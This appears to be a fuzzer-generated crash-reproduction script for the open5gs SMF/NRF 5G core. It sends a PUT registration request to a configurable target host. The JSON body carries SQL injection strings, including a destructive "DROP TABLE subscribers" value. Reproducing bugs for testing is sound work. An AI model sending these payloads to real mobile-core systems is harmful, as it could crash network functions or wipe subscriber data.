#!/usr/bin/env python3
# Crash reproduction for open5gs-smf (low)
# Detected: Sat May  9 02:01:39 2026
import http.client, json

host, port = '127.0.0.1', 80  # Update to target IP
method = 'PUT'
path = '/nnrf-nfm/v1/nf-instances/NSSF-fuzz-1449'
body = b'{"nfInstanceId": "NONE", "nfType": "\' OR \'1\'=\'1", "nfStatus": "\' OR \'1\'=\'1", "ipv4Addresses": [], "fqdn": "amf.open5gs.local", "priority": 1, "capacity": 0, "load": 50, "nfServices": [{"serviceInstanceId": "namf-comm-001", "serviceName": "namf-comm", "versions": [{"apiVersionInUri": "v1", "apiFullVersion": "1.0.0"}], "scheme": "http", "nfServiceStatus": "REGISTERED", "ipEndPoints": [{"ipv4Address": "172.23.0.20", "port": 7777}]}], "supiOrSuci": "\'; DROP TABLE subscribers; --"}'
conn = http.client.HTTPConnection(host, port, timeout=10)
headers = {'Content-Type': 'application/json'}
if body:
    conn.request(method, path, body=body, headers=headers)
else:
    conn.request(method, path, headers=headers)
resp = conn.getresponse()
print(f'Status: {resp.status}')
print(f'Body: {resp.read()[:500]}')
